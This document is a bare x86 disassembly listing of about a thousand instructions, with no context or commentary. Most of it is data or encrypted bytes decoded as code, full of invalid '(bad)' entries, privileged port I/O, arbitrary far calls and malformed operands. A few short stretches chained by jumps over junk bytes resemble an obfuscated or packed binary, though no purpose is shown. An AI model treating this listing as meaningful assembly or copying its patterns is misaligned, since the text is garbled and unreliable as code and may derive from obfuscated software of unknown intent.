  408c44:	push   edi
  408c45:	ret    
  408c46:	loop   0x408c1d
  408c48:	aam    0x23
  408c4a:	mov    ch,0x17
  408c4c:	xchg   ebp,eax
  408c4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c4e:	or     eax,0x64758373
  408c53:	inc    esi
  408c54:	hlt    
  408c55:	adc    BYTE PTR [eax+edx*8],bh
  408c58:	pop    esi
  408c59:	inc    ebx
  408c5a:	out    dx,al
  408c5b:	aam    0xe2
  408c5d:	sbb    al,0xcf
  408c5f:	mov    ebp,0xb613d145
  408c64:	cmp    bl,BYTE PTR [ebx+0x68]
  408c67:	pushf  
  408c68:	xor    eax,0x8a6744a0
  408c6d:	dec    ebp
  408c6e:	adc    al,0xea
  408c70:	mov    ecx,0xcbeaf2f3
  408c75:	cmp    ecx,DWORD PTR [esi]
  408c77:	xor    al,0x3a
  408c79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c7a:	add    BYTE PTR [esi+0x58],dl
  408c7d:	(bad)  
  408c7e:	fisub  WORD PTR [esi+0x73]
  408c81:	push   0xae0551f3
  408c86:	sbb    al,0xe7
  408c88:	leave  
  408c89:	test   DWORD PTR [ebp+0x70],eax
  408c8c:	mov    BYTE PTR [ecx+0x4d87d6d1],0xf4
  408c93:	pop    esp
  408c94:	push   ebp
  408c95:	dec    edi
  408c96:	jle    0x408c75
  408c98:	xor    ebp,DWORD PTR [edx]
  408c9a:	mov    al,ds:0x50800555
  408c9f:	xor    eax,DWORD PTR [edi*4+0x71b0365e]
  408ca6:	jbe    0x408c63
  408ca8:	sub    bl,dl
  408caa:	inc    esp
  408cab:	xor    al,0xe6
  408cad:	scas   eax,DWORD PTR es:[edi]
  408cae:	retf   
  408caf:	and    al,0x62
  408cb1:	mov    eax,ds:0xee117d52
  408cb6:	(bad)  
  408cb8:	cmp    al,BYTE PTR [esi]
  408cba:	push   0xbe419885
  408cbf:	inc    eax
  408cc0:	popf   
  408cc1:	mov    eax,ds:0x6add482e
  408cc6:	sbb    eax,0xdc981a88
  408ccb:	out    dx,eax
  408ccc:	pusha  
  408ccd:	pop    ds
  408cce:	add    eax,0xdea317f
  408cd3:	cmc    
  408cd4:	in     eax,dx
  408cd5:	bound  eax,QWORD PTR [esi+0x4b]
  408cd8:	sar    BYTE PTR [ebx+0xaaa879d],1
  408cde:	lods   eax,DWORD PTR ds:[esi]
  408cdf:	out    0x29,al
  408ce1:	aaa    
  408ce2:	pop    edx
  408ce3:	ss jle 0x408c8a
  408ce6:	outs   dx,DWORD PTR ds:[esi]
  408ce7:	ss das 
  408ce9:	push   ecx
  408cea:	ss enter 0xeaaf,0xf
  408cef:	mov    eax,ebp
  408cf1:	ss sub eax,0xb5848798
  408cf7:	adc    eax,0x8fd318a
  408cfc:	pusha  
  408cfd:	adc    bl,BYTE PTR [ebx+0x67bf03cf]
  408d03:	imul   esp,DWORD PTR [ecx-0xf],0x800c8a35
  408d0a:	mov    eax,0xc0638c2c
  408d0f:	pop    ebp
  408d10:	pushf  
  408d11:	mov    cl,0x47
  408d13:	jg     0x408cf7
  408d15:	lahf   
  408d16:	repz or al,0xa3
  408d19:	push   es
  408d1a:	push   esp
  408d1b:	pop    ss
  408d1c:	aaa    
  408d1d:	mov    DWORD PTR cs:[ecx+0x5abd380f],edi
  408d24:	mov    eax,ds:0xeeee5226
  408d29:	xchg   BYTE PTR [eax],bh
  408d2b:	call   0xf3c3:0xbe8f4c0e
  408d32:	pop    edi
  408d33:	or     eax,0x1f8e758b
  408d38:	(bad)  
  408d39:	shl    BYTE PTR [ebx-0x6d],cl
  408d3c:	mov    dl,0xe2
  408d3e:	stos   BYTE PTR es:[edi],al
  408d3f:	xchg   esp,eax
  408d40:	push   edi
  408d41:	xchg   esi,eax
  408d42:	in     eax,dx
  408d43:	daa    
  408d44:	(bad)  
  408d45:	push   esi
  408d46:	and    DWORD PTR [esi+eax*2-0x32],esp
  408d4a:	hlt    
  408d4b:	out    dx,eax
  408d4c:	outs   dx,DWORD PTR ds:[esi]
  408d4d:	out    dx,al
  408d4e:	dec    ecx
  408d4f:	sub    al,BYTE PTR [ebx+0x2a0726c9]
  408d55:	aad    0x85
  408d57:	(bad)  
  408d59:	adc    DWORD PTR [eax+0x37],0xb
  408d5d:	adc    bl,bl
  408d5f:	xor    DWORD PTR [edx],ecx
  408d61:	inc    edi
  408d62:	dec    edi
  408d63:	mov    BYTE PTR [ebx+0x2c00c0d2],ah
  408d69:	xchg   ecx,eax
  408d6a:	inc    esp
  408d6b:	aad    0x49
  408d6d:	mov    cl,0xf9
  408d6f:	icebp  
  408d70:	inc    eax
  408d71:	inc    edx
  408d72:	das    
  408d73:	inc    edi
  408d74:	je     0x408df5
  408d76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d77:	mov    eax,0x905f2563
  408d7c:	and    BYTE PTR [ecx],ch
  408d7e:	iret   
  408d7f:	mov    bh,0x56
  408d81:	xchg   DWORD PTR [ebx],esi
  408d83:	jne    0x408deb
  408d85:	pop    esp
  408d86:	(bad)  
  408d87:	call   0xcc31a1e2
  408d8c:	sbb    eax,0xbcfe7cb4
  408d91:	xor    eax,0x6e7b0cf3
  408d96:	or     dl,BYTE PTR [eax-0x1f]
  408d99:	jp     0x408db3
  408d9b:	sub    al,BYTE PTR [edx]
  408d9d:	imul   ecx,DWORD PTR [eax+0x63],0x1d
  408da1:	push   cs
  408da2:	stos   DWORD PTR es:[edi],eax
  408da3:	mov    ds:0x8fd82f3d,eax
  408da8:	mov    fs,esp
  408daa:	cvtdq2ps xmm6,XMMWORD PTR [esp+eiz*4+0x73]
  408daf:	out    0xfc,eax
  408db1:	not    DWORD PTR [eax+0x61]
  408db4:	sbb    eax,0x5fd621da
  408db9:	enter  0x7771,0x13
  408dbd:	mov    esi,?
  408dbf:	add    esi,DWORD PTR [edx]
  408dc1:	lods   al,BYTE PTR ds:[esi]
  408dc2:	leave  
  408dc3:	xchg   esp,eax
  408dc4:	in     al,dx
  408dc5:	xor    ch,BYTE PTR [edx]
  408dc7:	adc    DWORD PTR [edi],ebx
  408dc9:	int    0xa7
  408dcb:	fadd   st,st(0)
  408dcd:	scas   eax,DWORD PTR es:[edi]
  408dce:	sub    BYTE PTR [edi-0x78],al
  408dd1:	ret    0xc78f
  408dd4:	add    BYTE PTR [esi],al
  408dd6:	jmp    0xa6583405
  408ddb:	dec    eax
  408ddc:	mov    ch,BYTE PTR cs:[esi+0x1e]
  408de0:	out    dx,al
  408de1:	xor    BYTE PTR ds:0x331b1c53,bh
  408de7:	test   DWORD PTR [ecx+0x26687e8b],0x8760a21c
  408df1:	adc    al,0xee
  408df3:	push   ds
  408df4:	adc    DWORD PTR ss:[ebp-0x7f],esp
  408df8:	and    edi,DWORD PTR [ebx+0x1e55eb55]
  408dfe:	cld    
  408dff:	cwde   
  408e00:	mov    eax,ds:0x9fb286d
  408e05:	xchg   BYTE PTR [eax-0x1f],bl
  408e08:	cmp    cl,BYTE PTR [ecx-0x64]
  408e0b:	daa    
  408e0c:	push   ecx
  408e0d:	pop    edx
  408e0e:	push   ds
  408e0f:	or     al,BYTE PTR [esi+0x639fb5bc]
  408e15:	imul   ebp,DWORD PTR [edi+ebx*4-0x7994f4d5],0xb84a36b
  408e20:	inc    esp
  408e21:	jl     0x408e61
  408e23:	cs out dx,al
  408e25:	mov    ebx,0xcf64d10f
  408e2a:	mov    ch,0xcd
  408e2c:	add    BYTE PTR [ebx],al
  408e2e:	sbb    BYTE PTR [esi],ah
  408e30:	test   BYTE PTR [edi-0x2ad91320],0x27
  408e37:	sti    
  408e38:	mov    ebx,eax
  408e3a:	jecxz  0x408e14
  408e3c:	fcmovu st,st(0)
  408e3e:	jno    0x408df8
  408e40:	mov    esp,0x2d0ac0f
  408e45:	mov    DWORD PTR [ebp+0x14],eax
  408e48:	mov    eax,DWORD PTR [esi]
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	push   ebx
  408e76:	push   ebx
  408e77:	push   es
  408e78:	push   0x3a
  408e7a:	push   ecx
  408e7b:	sbb    BYTE PTR [eax],bl
  408e7d:	sahf   
  408e7e:	adc    bl,BYTE PTR [eax]
  408e80:	sbb    bh,dl
  408e82:	repnz shr DWORD PTR [eax],cl
  408e85:	mov    bl,BYTE PTR [ecx]
  408e87:	adc    BYTE PTR [eax-0x34d43bac],dh
  408e8d:	popf   
  408e8e:	sub    bh,BYTE PTR [esi-0xcce966f]
  408e94:	scas   al,BYTE PTR es:[edi]
  408e95:	pop    ss
  408e96:	jmp    0x1399:0x8af77a62
  408e9d:	pusha  
  408e9e:	sub    bh,BYTE PTR [eax+ecx*2+0x31636f87]
  408ea5:	add    eax,0x102f55ca
  408eaa:	cwde   
  408eab:	pop    eax
  408eac:	add    eax,0xd05a89a6
  408eb1:	fwait
  408eb2:	push   ebx
  408eb3:	or     dl,BYTE PTR [ebx]
  408eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eb6:	fs xchg esp,eax
  408eb8:	sbb    ah,BYTE PTR [eax-0x79fbdc90]
  408ebe:	inc    eax
  408ebf:	push   edi
  408ec0:	xchg   edx,eax
  408ec1:	(bad)  
  408ec2:	retf   
  408ec3:	push   edx
  408ec4:	imul   ecx,eax,0xd39cc3dd
  408eca:	repnz daa 
  408ecc:	popf   
  408ecd:	or     al,0x8f
  408ecf:	inc    edx
  408ed0:	test   DWORD PTR [ecx+0x444e0424],edi
  408ed6:	inc    esp
  408ed7:	xchg   esi,eax
  408ed8:	sub    DWORD PTR [ebp+0x14578723],ebp
  408ede:	in     eax,dx
  408edf:	push   ecx
  408ee0:	or     eax,0x154dbe5d
  408ee5:	enter  0xb886,0x67
  408ee9:	int3   
  408eea:	sbb    cl,al
  408eec:	jl     0x408eaa
  408eee:	inc    edi
  408eef:	cmp    cl,BYTE PTR [eax+edi*2-0x22]
  408ef3:	test   eax,0xa4022915
  408ef8:	push   ecx
  408ef9:	or     al,0x6a
  408efb:	push   ecx
  408efc:	adc    eax,0xf038dd47
  408f01:	loopne 0x408f6e
  408f03:	add    bl,BYTE PTR [ecx]
  408f05:	jmp    0x408f:0x7ce2226e
  408f0c:	fwait
  408f0d:	push   edi
  408f0e:	imul   edx,esi,0xe6cef31e
  408f14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f15:	je     0x408f52
  408f17:	jns    0x408f3c
  408f19:	push   ebx
  408f1a:	addr16 push edi
  408f1c:	fwait
  408f1d:	cmp    al,0x6c
  408f1f:	push   ebx
  408f20:	add    cl,dl
  408f22:	sbb    dh,BYTE PTR [ecx]
  408f24:	loop   0x408f3f
  408f26:	xchg   edx,eax
  408f27:	and    DWORD PTR [ebp-0x6ff1bd2d],edx
  408f2d:	lods   al,BYTE PTR ds:[esi]
  408f2e:	push   cs
  408f2f:	mov    BYTE PTR [esi+ebx*1+0x39],al
  408f33:	stos   DWORD PTR es:[edi],eax
  408f34:	(bad)  [ebx+ebp*8+0x6e8eb51]
  408f3b:	int    0xd
  408f3d:	mov    ds:0x29ab78f0,eax
  408f42:	not    DWORD PTR [edi+0x63]
  408f45:	call   0xdb9b5f35
  408f4a:	mov    WORD PTR [edx],?
  408f4c:	mov    ecx,0x79036e88
  408f51:	popf   
  408f52:	sbb    eax,0x5595fb0f
  408f57:	mov    ?,WORD PTR [esp+esi*2]
  408f5a:	(bad)  
  408f5d:	sbb    DWORD PTR [ecx+0x35],esp
  408f60:	sbb    DWORD PTR [ebp+0x7b],edi
  408f63:	push   eax
  408f64:	push   esp
  408f65:	cmc    
  408f66:	xor    BYTE PTR [ecx-0xc9fba72],bl
  408f6c:	xchg   DWORD PTR [ecx+0x205a6a20],ecx
  408f72:	in     eax,dx
  408f73:	inc    ebp
  408f74:	bswap  esp
  408f76:	jo     0x408f31
  408f78:	pop    edx
  408f79:	add    DWORD PTR [ebp-0x7e4ba30a],esi
  408f7f:	and    DWORD PTR [edi],0xfffffffa
  408f82:	dec    esi
  408f83:	mov    cl,0x54
  408f85:	push   0x51d553bf
  408f8a:	inc    ecx
  408f8b:	mov    al,0xfa
  408f8d:	mov    eax,ds:0xd1e90435
  408f92:	call   0xb401:0x7d66bb1d
  408f99:	pop    eax
  408f9a:	fisttp DWORD PTR [edx-0x50]
  408f9d:	sub    DWORD PTR [esi+0x6141550c],ebp
  408fa3:	lods   al,BYTE PTR ds:[esi]
  408fa4:	imul   ebx,DWORD PTR [ebx],0x20
  408fa7:	push   eax
  408fa8:	fnstcw WORD PTR ds:0xced9b089
  408fae:	sbb    BYTE PTR [eax+0x53a5ac32],cl
  408fb4:	mov    cl,0x31
  408fb6:	lods   al,BYTE PTR ds:[esi]
  408fb7:	jmp    0x664f:0x79b4f697
  408fbe:	call   0x8fc9ef2e
  408fc3:	retf   0xfa8c
  408fc6:	leave  
  408fc7:	inc    edx
  408fc8:	pop    esi
  408fc9:	cmc    
  408fca:	into   
  408fcb:	push   ecx
  408fcc:	iret   
  408fcd:	push   ss
  408fce:	scas   eax,DWORD PTR es:[edi]
  408fcf:	fsubrp st(5),st
  408fd1:	das    
  408fd2:	or     BYTE PTR [edi+edx*1-0x16],cl
  408fd6:	xchg   esi,eax
  408fd7:	ret    0xb07b
  408fda:	sub    BYTE PTR [eax+0x1],dl
  408fdd:	dec    esi
  408fde:	cmc    
  408fdf:	test   BYTE PTR [esi+0x65],0x30
  408fe3:	sub    BYTE PTR [ecx],ch
  408fe5:	jnp    0x408fb4
  408fe7:	rcr    ecx,cl
  408fe9:	popa   
  408fea:	outs   dx,BYTE PTR ds:[esi]
  408feb:	scas   eax,DWORD PTR es:[edi]
  408fec:	les    esp,FWORD PTR [eax-0x6300d2a6]
  408ff2:	repnz ficom WORD PTR [ecx]
  408ff5:	fnstenv [edx+0x54]
  408ff8:	xchg   BYTE PTR [ebx+0x5df4de38],bl
  408ffe:	adc    ecx,DWORD PTR [edx]
  409000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409001:	push   ebp
  409002:	int3   
  409003:	inc    eax
  409004:	imul   ecx,esp,0xff850506
  40900a:	inc    eax
  40900b:	cdq    
  40900c:	sub    al,0x77
  40900e:	and    bl,al
  409010:	test   ebx,ecx
  409012:	test   al,0x1f
  409014:	test   bl,cl
  409016:	pop    esi
  409017:	sbb    ch,al
  409019:	(bad)  
  40901a:	sbb    eax,0xdbca4afb
  40901f:	(bad)  [ecx+0x3f]
  409022:	in     al,0x94
  409024:	xor    al,BYTE PTR [ecx+0x58d58910]
  40902a:	mov    ecx,0x6f0f6acc
  40902f:	xor    eax,0xfc8d14fd
  409034:	pop    ecx
  409035:	cwde   
  409036:	inc    eax
  409037:	mov    DWORD PTR [esi+0x1],ecx
  40903a:	call   0xd80a:0xc81ba03b
  409041:	and    BYTE PTR [esi+0x21],0xee
  409045:	daa    
  409046:	mov    al,ds:0x25aa6b77
  40904b:	(bad)  
  40904d:	ja     0x409093
  40904f:	imul   ebx,DWORD PTR [eax],0x992e4e81
  409055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409056:	jo     0x4090a9
  409058:	(bad)  
  409059:	leave  
  40905a:	cs loop 0x409041
  40905d:	xor    cl,al
  40905f:	sbb    al,dh
  409061:	or     ebx,esp
  409063:	int3   
  409064:	push   cs
  409065:	or     al,0x85
  409067:	out    0x57,al
  409069:	inc    esp
  40906a:	repnz mov al,0x14
  40906d:	fisub  WORD PTR [edi-0x58]
  409070:	repnz mov DWORD PTR [edi+edi*1],ebx
  409074:	call   0x2aed:0x1369be18
  40907b:	mov    edx,0x7829a9c0
  409080:	out    0x19,al
  409082:	sti    
  409083:	nop
  409084:	sbb    ah,dl
  409086:	add    eax,0xa8b2d966
  40908b:	ret    0x8f43
  40908e:	jmp    0x8286:0x6c552951
  409095:	xor    eax,0x9bba691d
  40909a:	mov    cl,0x5c
  40909c:	aaa    
  40909d:	mov    bl,0x6b
  40909f:	outs   dx,DWORD PTR ds:[esi]
  4090a0:	aaa    
  4090a1:	rcr    DWORD PTR [edi-0x3],cl
  4090a4:	fwait
  4090a5:	sub    esp,DWORD PTR [esi+0x1b68bd86]
  4090ab:	cdq    
  4090ac:	cs jne 0x4090cf
  4090af:	mov    ecx,0xf1d94ea9
  4090b4:	sub    bh,BYTE PTR [ecx+0x53]
  4090b7:	pop    esp
  4090b8:	loope  0x40910f
  4090ba:	add    esp,DWORD PTR [ebp+0x6987781c]
  4090c0:	lahf   
  4090c1:	mov    dl,BYTE PTR [ebx+0x6fd97f7b]
  4090c7:	test   esp,0xfcce9d21
  4090cd:	dec    esi
  4090ce:	fdiv   QWORD PTR [ecx-0x17ac2cc3]
  4090d4:	sbb    ebx,DWORD PTR ds:0x7edafe70
  4090da:	sub    BYTE PTR [esi-0x2a5fd300],cl
  4090e0:	mov    al,0xf9
  4090e2:	ss pop ebp
  4090e4:	lods   al,BYTE PTR ds:[esi]
  4090e5:	test   DWORD PTR [ebx+0x7a],edi
  4090e8:	lahf   
  4090e9:	fisub  WORD PTR [edi+0x3c]
  4090ec:	into   
  4090ed:	and    al,0xfc
  4090ef:	iret   
  4090f0:	mov    dl,0x1a
  4090f2:	or     DWORD PTR [ebx+0x3d57b868],edx
  4090f8:	fstp   DWORD PTR [ecx-0x6a685253]
  4090fe:	jnp    0x40909a
  409100:	mov    bl,0x41
  409102:	cmp    bl,dl
  409104:	and    bl,BYTE PTR [esi]
  409106:	sahf   
  409107:	jnp    0x409152
  409109:	push   edi
  40910a:	mov    ah,0x41
  40910c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40910d:	and    BYTE PTR [edx-0x3e5e6a23],ah
  409113:	fisub  WORD PTR [esi+0x5e]
  409116:	scas   eax,DWORD PTR es:[edi]
  409117:	mov    bl,0x4e
  409119:	sub    bl,ah
  40911b:	mov    al,0x39
  40911d:	pop    eax
  40911e:	ds scas eax,DWORD PTR es:[edi]
  409120:	adc    edi,DWORD PTR ds:[ebp+0x53]
  409124:	(bad)  
  409125:	or     eax,0x4fb55be0
  40912a:	pop    es
  40912b:	inc    esp
  40912c:	sbb    DWORD PTR [eax],ecx
  40912e:	dec    esp
  40912f:	mov    fs,WORD PTR [edx]
  409131:	ret    
  409132:	int3   
  409133:	ins    DWORD PTR es:[edi],dx
  409134:	imul   esi,DWORD PTR [ebp+esi*2+0x5394d58a],0xffffffa3
  40913c:	ins    DWORD PTR es:[edi],dx
  40913d:	xchg   edi,eax
  40913e:	loope  0x40916e
  409140:	in     al,0x93
  409142:	pop    eax
  409143:	xlat   BYTE PTR ds:[ebx]
  409144:	ror    BYTE PTR [edx+0x7d2bded1],cl
  40914a:	rcr    DWORD PTR [esi+0x28da54b5],0x18
  409151:	dec    edx
  409152:	cld    
  409153:	pop    ebx
  409154:	cmp    eax,0xf852db2d
  409159:	push   ss
  40915a:	fcomp  st(4)
  40915c:	retf   
  40915d:	outs   dx,BYTE PTR ds:[esi]
  40915e:	das    
  40915f:	fisubr DWORD PTR [ebx]
  409161:	cwde   
  409162:	lods   eax,DWORD PTR ds:[esi]
  409163:	ret    
  409164:	fistp  WORD PTR [ebx-0x2f]
  409167:	inc    edx
  409168:	rol    BYTE PTR [bp+si-0x67],0x56
  40916d:	in     eax,dx
  40916e:	stc    
  40916f:	fwait
  409170:	stos   DWORD PTR es:[edi],eax
  409171:	dec    esi
  409172:	jno    0x409144
  409174:	jnp    0x40917c
  409176:	xor    BYTE PTR [eiz*8+0xbdf9441],ah
  40917d:	add    BYTE PTR [eax-0x70],cl
  409180:	lds    esp,FWORD PTR [ebp-0x15b669f4]
  409186:	cmp    al,0x1b
  409188:	gs mov esp,0x3ba9428a
  40918e:	test   dl,0x9a
  409191:	add    DWORD PTR [esi],esp
  409193:	out    dx,al
  409194:	(bad)  
  409195:	in     eax,0x86
  409197:	sub    ebp,esi
  409199:	sub    ebp,DWORD PTR [ecx-0x60a2ea12]
  40919f:	dec    ebx
  4091a0:	mov    es,WORD PTR [edx+eax*4]
  4091a3:	or     eax,0xcaeb39b2
  4091a8:	nop
  4091a9:	and    ecx,DWORD PTR [ecx-0x5c69bc5b]
  4091af:	adc    BYTE PTR [ebx],cl
  4091b1:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4091b3:	ins    BYTE PTR es:[edi],dx
  4091b4:	fidiv  DWORD PTR [ebx]
  4091b6:	mov    ?,ebx
  4091b8:	cmp    al,0xe1
  4091ba:	mov    esp,0x5c4f8149
  4091bf:	in     al,0x78
  4091c1:	or     al,0x20
  4091c3:	pop    ecx
  4091c4:	or     al,al
  4091c6:	dec    esp
  4091c7:	xchg   edx,eax
  4091c8:	int3   
  4091c9:	dec    edx
  4091ca:	retf   0x157
  4091cd:	into   
  4091ce:	mov    ds:0x61547c4d,al
  4091d3:	inc    edx
  4091d4:	fs sub al,0x99
  4091d7:	inc    esi
  4091d8:	cmp    BYTE PTR [ecx-0x62fd10a3],cl
  4091de:	jns    0x4091ab
  4091e0:	jl     0x4091a0
  4091e2:	sar    BYTE PTR ds:0xae85cfc9,cl
  4091e8:	push   ds
  4091e9:	adc    BYTE PTR ds:0x35e4b985,0xe2
  4091f0:	mov    DWORD PTR [edx],eax
  4091f2:	xchg   ebx,eax
  4091f3:	cmp    edx,DWORD PTR [esp+edi*2-0x2a4ed8b6]
  4091fa:	lahf   
  4091fb:	(bad)  
  4091fc:	mov    al,ds:0x5584b495
  409201:	lock or bl,dl
  409204:	sub    eax,0xb037476c
  409209:	bound  eax,QWORD PTR [ecx+0xe713b3a]
  40920f:	jae    0x409288
  409211:	mov    ecx,0x47f77df6
  409216:	xchg   esp,eax
  409217:	cmp    esi,esp
  409219:	mov    ds:0x2cb4c547,eax
  40921e:	(bad)  
  40921f:	(bad)  
  409220:	repnz inc esp
  409222:	push   ebx
  409223:	clc    
  409224:	sbb    ebp,DWORD PTR fs:[ebp-0x4d]
  409228:	dec    eax
  409229:	adc    bl,dh
  40922b:	mov    dl,0xc
  40922d:	fwait
  40922e:	push   esi
  40922f:	sbb    DWORD PTR [edi+0x8],0xa8bc099f
  409236:	cli    
  409237:	add    al,0xad
  409239:	loop   0x409273
  40923b:	clc    
  40923c:	xor    esi,DWORD PTR [ebp+0xb90a8d1]
  409242:	xor    edx,edx
  409244:	shld   edx,eax,0x2
  409248:	xor    edx,ecx
  40924a:	mov    DWORD PTR [ebp+0xc],edx
  40924d:	jmp    0x40962b
  409252:	loop   0x409279
  409254:	es jmp 0x617f:0x1d1aea26
  40925c:	mov    eax,ds:0x71225070
  409261:	mov    al,0xc0
  409263:	dec    ecx
  409264:	sbb    BYTE PTR [eax],bl
  409266:	sahf   
  409267:	adc    bl,BYTE PTR [eax]
  409269:	sbb    BYTE PTR [ecx+0x2c2f6f37],ah
  40926f:	push   edx
  409270:	shr    eax,cl
  409272:	pop    ss
  409273:	push   0x802f7a3a
  409278:	pop    ss
  409279:	jmp    0x40928f
  40927b:	xor    DWORD PTR [ecx+edx*2-0x371282a6],0xffffffa0
  409283:	adc    dl,BYTE PTR [edi+edx*4-0x588c2348]
  40928a:	xchg   edi,eax
  40928b:	jp     0x409286
  40928d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40928e:	jg     0x4092da
  409290:	fdiv   DWORD PTR [ecx+edx*8+0x15e11050]
  409297:	int    0xfd
  409299:	jmp    0x4092c6
  40929b:	shl    BYTE PTR [ecx+0x684e221d],cl
  4092a1:	push   ebp
  4092a2:	pusha  
  4092a3:	push   0xffffffee
  4092a5:	inc    ebp
  4092a6:	push   ds
  4092a7:	dec    esp
  4092a8:	mov    ebp,0x72bfc921
  4092ad:	inc    edi
  4092ae:	mov    bl,0xb9
  4092b0:	xor    al,0x77
  4092b2:	xchg   esp,eax
  4092b3:	pop    edx
  4092b4:	sbb    DWORD PTR cs:[edx-0xbc61ce9],edx
  4092bb:	mov    ds:0x79cea0c2,al
  4092c0:	fndisi(8087 only) 
  4092c2:	cmp    ah,0xce
  4092c5:	sbb    eax,0x6c0aa5c6
  4092ca:	pop    esp
  4092cb:	sbb    al,0x4e
  4092cd:	push   esi
  4092ce:	sbb    DWORD PTR ds:0x97e5f7b4,ebp
  4092d4:	loopne 0x4092d3
  4092d6:	pop    ebx
  4092d7:	out    dx,eax
  4092d8:	inc    eax
  4092d9:	xor    edi,DWORD PTR [esi-0x625f8b13]
  4092df:	getsec 
  4092e1:	mov    ch,BYTE PTR [edi]
  4092e3:	mov    dh,0x6
  4092e5:	and    bh,BYTE PTR cs:[eax+esi*2-0x76]
  4092ea:	or     al,dl
  4092ec:	into   
  4092ed:	push   es
  4092ee:	(bad)  
  4092ef:	pslld  mm5,mm3
  4092f2:	arpl   WORD PTR [edi+0x5a9e7cd0],ax
  4092f8:	test   eax,0xd2d86194
  4092fd:	sub    ebp,esp
  4092ff:	jne    0x4092fd
  409301:	fild   WORD PTR [ebp-0x7]
  409304:	aad    0x36
  409306:	fld    DWORD PTR [eax+0x4350f150]
  40930c:	add    ebx,DWORD PTR [edi-0xa]
  40930f:	xchg   edx,eax
  409310:	pop    ebx
  409311:	and    bl,BYTE PTR [esi]
  409313:	push   ds
  409314:	inc    edi
  409315:	ds loop 0x4092f3
  409318:	jge    0x409341
  40931a:	push   ds
  40931b:	dec    edi
  40931c:	pop    ds
  40931d:	dec    edx
  40931e:	xor    ch,bh
  409320:	jp     0x409319
  409322:	adc    esi,ecx
  409324:	(bad)  
  409325:	int    0x83
  409327:	inc    edx
  409328:	addr16 mov dl,0x54
  40932b:	lahf   
  40932c:	aad    0x53
  40932e:	jns    0x4092dd
  409330:	pop    esi
  409331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409332:	mul    esi
  409334:	scas   al,BYTE PTR es:[edi]
  409335:	push   es
  409336:	ins    BYTE PTR es:[edi],dx
  409337:	xor    al,0x4e
  409339:	cmp    eax,0xd9fe19d2
  40933e:	fnstenv [ecx-0x77]
  409341:	fadd   QWORD PTR [edi]
  409343:	int    0xda
  409345:	fdivp  st(7),st
  409347:	xchg   edi,eax
  409348:	out    0x2d,al
  40934a:	out    dx,al
  40934b:	jae    0x40931e
  40934d:	sbb    BYTE PTR [ebx],al
  40934f:	aam    0x28
  409351:	fdivr  st,st(6)
  409353:	xor    BYTE PTR [eax-0x2d125757],cl
  409359:	sahf   
  40935a:	mov    edi,0x115e3e89
  40935f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409360:	cmc    
  409361:	jge    0x40934d
  409363:	sbb    ebx,DWORD PTR [eax-0x6b7fd1f1]
  409369:	mov    ah,0xb8
  40936b:	mov    dl,0x4a
  40936d:	hlt    
  40936e:	shl    BYTE PTR [esi-0x68552166],1
  409374:	mov    bh,0x3b
  409376:	imul   ebx,eax,0xffffffd1
  409379:	arpl   WORD PTR [ebp+0x537e64ae],bx
  40937f:	ds ffree st(4)
  409382:	fstp   TBYTE PTR [esi]
  409384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409385:	inc    esp
  409386:	inc    ebx
  409387:	fwait
  409388:	push   ss
  409389:	out    dx,eax
  40938a:	loopne 0x409375
  40938c:	mov    dl,0x91
  40938e:	pop    ebx
  40938f:	dec    ebx
  409390:	cmp    BYTE PTR [ebp-0x28],cl
  409393:	mov    ecx,0xb05d44ab
  409398:	popa   
  409399:	call   DWORD PTR [ebp+0x8]
  40939c:	call   0x5733:0x137d53f5
  4093a3:	out    dx,eax
  4093a4:	xchg   DWORD PTR [ecx],ebp
  4093a6:	in     al,dx
  4093a7:	or     al,BYTE PTR [esi]
  4093a9:	dec    edi
  4093aa:	push   ecx
  4093ab:	inc    edx
  4093ac:	pop    ebx
  4093ad:	shl    DWORD PTR [ebx],0x7
  4093b0:	repnz sbb eax,DWORD PTR [esi]
  4093b3:	add    ebx,DWORD PTR [ebp-0x43f29396]
  4093b9:	mov    al,0xa9
  4093bb:	pop    ds
  4093bc:	adc    esp,DWORD PTR [ebx-0x34632f3a]
  4093c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093c3:	(bad)  
  4093c4:	popf   
  4093c5:	adc    edx,DWORD PTR [ebp+eax*4-0x1c]
  4093c9:	sbb    BYTE PTR [ebp+0x3d],bh
  4093cc:	std    
  4093cd:	std    
  4093ce:	mov    eax,0x59206c48
  4093d3:	(bad)  
  4093d4:	gs (bad) 
  4093d7:	and    BYTE PTR [edx],bh
  4093d9:	arpl   sp,ax
  4093db:	hlt    
  4093dc:	mov    al,0x9d
  4093de:	sbb    DWORD PTR [edi],edx
  4093e0:	mov    bh,0x80
  4093e2:	mov    ds:0xf3812516,eax
  4093e7:	fisttp WORD PTR [ebx+0x4c]
  4093ea:	mov    ebx,0x7ebae224
  4093ef:	test   al,0xfe
  4093f1:	test   eax,0x4c0ef720
  4093f6:	je     0x40938a
  4093f8:	scas   eax,DWORD PTR es:[edi]
  4093f9:	loope  0x409432
  4093fb:	cmp    esi,DWORD PTR [ecx+0x18]
  4093fe:	adc    bh,BYTE PTR [eax+ebx*4-0x10a2ad3a]
  409405:	pushf  
  409406:	leave  
